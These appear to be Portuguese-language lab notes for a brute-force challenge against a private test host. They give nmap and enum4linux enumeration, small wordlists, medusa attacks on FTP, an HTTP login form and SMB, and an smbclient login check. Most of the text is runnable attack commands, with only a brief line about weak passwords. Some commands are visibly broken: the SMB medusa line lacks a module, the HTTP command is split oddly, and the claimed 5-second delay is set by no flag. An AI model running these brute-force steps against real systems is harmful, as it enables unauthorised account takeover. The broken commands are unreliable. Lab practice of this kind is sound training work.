# public

Desafio Ataque força bruta

Enumeração
ping -c 3 192.168.56.101
nmap -sV -p 21,22,80,445,139 192.168.56.101
ftp 192.168.56.101
apartir dai criei as lista de usuario e senhas
lista usuarios
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
lista de senhas
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

com as listas prontas usamos o medusa
medusa -h 192.168.56.101 -U users.txt -p pass.txt -M ftp -t 6

na lista que o medusa mostrar, procurar por ACCOUNT FOUND que sera o login SUCESSO
este primeiro medoto é para ataque forca bruta em FTP, para evitar este tipo de ataques e nao ter senhas obvias ou senhas faceis como numero do rg, telefone, data de nascimento e etc

força bruta em formulario de login

na pagina de login da pagina que queira aplicar o ataque, verificar se tem alguma informação press F12 
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M 
http \ -m PAGE: '/DVMA/login.php'\ 
       -m FORM: 'username=^USER^&password=^PASS^&Login=login'\
       -m 'Fail=login failed' -t 6
       
Enumeração SMB
enum4linux -a 192.168.56.101 | tee enum4.output.txt

Criar as wordlist
lista usuarios
echo -e "user\nmsfadmin\nadmin\nroot" > smb_users.txt
lista de senhas
echo -e "123456\npassword\nqwerty\nmsfadmin" > senhas_spray.txt


medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M -t -T 50
este comando tenta um login acada 5 segundos
apos o comando rodar vai aparecer um linha com ACCOUNT FOUND e provavelmente sera a senha do sistema 
para testar o usuario e senha usar o smbclient -L //192.168.56.101 - U "nome usuario encontrado no brute force" se ok vai pedir a senha e se estiver correto tera acesso ao sistema.










